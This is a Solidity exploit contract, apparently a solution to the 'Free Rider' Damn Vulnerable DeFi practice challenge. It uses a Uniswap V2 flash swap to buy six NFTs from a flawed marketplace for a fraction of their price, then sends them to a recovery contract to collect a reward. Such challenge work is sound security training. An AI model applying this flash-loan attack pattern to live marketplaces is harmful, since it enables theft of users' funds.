// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@openzeppelin/contracts/token/ERC721/utils/ERC721Holder.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "solady/src/utils/SafeTransferLib.sol";
import "./FreeRiderNFTMarketplace.sol";

interface IWETH is IERC20 {
    function deposit() external payable;

    function withdraw(uint amount) external;
}

contract FreeRiderHack is ERC721Holder {
    FreeRiderNFTMarketplace mktplace;
    address recoveryContract;
    DamnValuableNFT nft;
    IUniswapV2Pair pair;

    address owner;

    constructor(
        FreeRiderNFTMarketplace _mktplace,
        address _recoveryContract,
        IUniswapV2Pair _pair
    ) {
        mktplace = _mktplace;
        recoveryContract = _recoveryContract;
        pair = _pair;

        owner = msg.sender;
    }

    function attack(uint wethAmount) public {
        require(msg.sender == owner, "OnlyOwner");

        // get correct data to setup swap to be flash swap
        bytes memory data = abi.encode(pair.token0(), wethAmount);
        // call flash swap
        pair.swap(wethAmount, 0, address(this), data);
    }

    // This function is called by the pair contract, to receive tokens and then return them
    function uniswapV2Call(
        address sender,
        uint amount0,
        uint amount1,
        bytes calldata data
    ) external {
        require(msg.sender == address(pair), "not pair");
        require(sender == address(this), "not sender");

        (address tokenBorrow, uint256 wethAmount) = abi.decode(
            data,
            (address, uint256)
        );

        IWETH weth = IWETH(tokenBorrow);

        //unwrap the weth
        weth.withdraw(wethAmount);

        //set token ids
        uint8 tokenCount = 6;
        uint256[] memory tokens = new uint256[](tokenCount);
        for (uint i = 0; i < tokenCount; i++) {
            tokens[i] = i;
        }

        //buy all nft's for only 15 eth
        mktplace.buyMany{value: wethAmount}(tokens);
        nft = DamnValuableNFT(mktplace.token());

        //send all nfts to reward contract, with data of who to send eth
        for (uint i = 0; i < tokenCount; i++) {
            nft.safeTransferFrom(
                address(this),
                recoveryContract,
                tokens[i],
                abi.encode(owner)
            );
        }

        // approx 0.3% fee, +1 to round up
        uint fee = (wethAmount * 3) / 997 + 1;
        uint amountToRepay = wethAmount + fee;

        // wrap eth
        weth.deposit{value: amountToRepay}();

        // Repay
        weth.transfer(address(pair), amountToRepay);
    }

    receive() external payable {}
}
